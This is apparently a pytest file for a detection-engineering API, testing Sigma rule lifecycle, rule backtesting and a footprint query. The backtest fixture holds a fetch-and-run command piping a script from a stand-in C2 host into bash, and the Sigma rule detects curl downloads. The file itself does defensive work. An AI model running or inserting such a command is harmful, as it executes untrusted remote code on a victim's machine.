"""Detection Engineering & Footprint Target Query Tests.

Verifies:
1. Custom Sigma rule management (list, import, patch, delete).
2. Ad-hoc custom Sigma YAML backtesting against historical event store.
3. Target Indicator Footprint query (/footprint/target/query).
"""

from .conftest import make_run

SAMPLE_SIGMA_YAML = """
title: Test Malicious Curl Execution
id: e2b08fa1-test-curl-0001
status: experimental
description: Detects curl downloading bash scripts directly into interpreter
level: high
tags:
  - attack.execution
  - attack.t1059.004
detection:
  selection:
    CommandLine|contains:
      - 'curl http'
      - 'curl https'
  condition: selection
"""


def test_custom_sigma_rules_lifecycle(client):
    # 1. Initially empty or listable
    resp = client.get("/rules/sigma/custom")
    assert resp.status_code == 200
    initial_count = len(resp.json())

    # 2. Import custom rule
    resp = client.post("/rules/sigma/import", json={"sigma_yaml": SAMPLE_SIGMA_YAML, "enabled": True})
    assert resp.status_code == 200
    rule = resp.json()["rule"]
    rule_id = rule["rule_id"]
    assert "test-curl" in rule_id or "curl" in rule["title"].lower()
    assert rule["enabled"] is True

    # 3. Retrieve custom rules
    resp = client.get("/rules/sigma/custom")
    assert resp.status_code == 200
    rules = resp.json()
    assert any(r["rule_id"] == rule_id for r in rules)

    # 4. Patch rule to disabled
    resp = client.patch(f"/rules/sigma/custom/{rule_id}", json={"enabled": False, "level": "medium"})
    assert resp.status_code == 200
    updated = resp.json()["rule"]
    assert updated["enabled"] is False
    assert updated["level"] == "medium"

    # 5. Delete custom rule
    resp = client.delete(f"/rules/sigma/custom/{rule_id}")
    assert resp.status_code == 200
    assert resp.json()["status"] == "deleted"

    # 6. Verify deleted
    resp = client.get("/rules/sigma/custom")
    assert not any(r["rule_id"] == rule_id for r in resp.json())


def test_custom_rule_backtest(client):
    run_id = make_run(client, sample_name="curl_agent.exe")
    # Ingest an event that matches the curl rule
    client.post(
        "/ingest/batch",
        json=[
            {
                "run_id": run_id,
                "platform": "linux",
                "event_type": "process_create",
                "timestamp": "2026-08-01T12:00:00Z",
                "pid": 2048,
                "process_name": "curl",
                "command_line": "curl https://c2-tracker.org/payload.sh | bash",
            }
        ],
    )

    # Backtest with raw YAML
    resp = client.post(
        "/rules/backtest/custom",
        json={"sigma_yaml": SAMPLE_SIGMA_YAML, "max_events": 500},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["events_scanned"] >= 1
    assert data["matches_count"] >= 1
    assert len(data["sample_matches"]) >= 1
    assert data["sample_matches"][0]["process_name"] == "curl"


def test_footprint_target_query(client):
    # Query an IP target with mock=1
    resp = client.get("/footprint/target/query?target=198.51.100.44&mock=1")
    assert resp.status_code == 200
    data = resp.json()
    assert data["sample"]["name"] == "198.51.100.44"
    assert len(data["seed_ips"]) == 1
    assert data["seed_ips"][0]["ip"] == "198.51.100.44"
    assert len(data["passive"]["resolutions"]) > 0
    assert len(data["passive"]["passive_dns"]) > 0

    # Query a domain target with mock=1
    resp = client.get("/footprint/target/query?target=c2-tracker.org&mock=1")
    assert resp.status_code == 200
    domain_data = resp.json()
    assert domain_data["sample"]["name"] == "c2-tracker.org"
    assert len(domain_data["seed_ips"]) >= 1
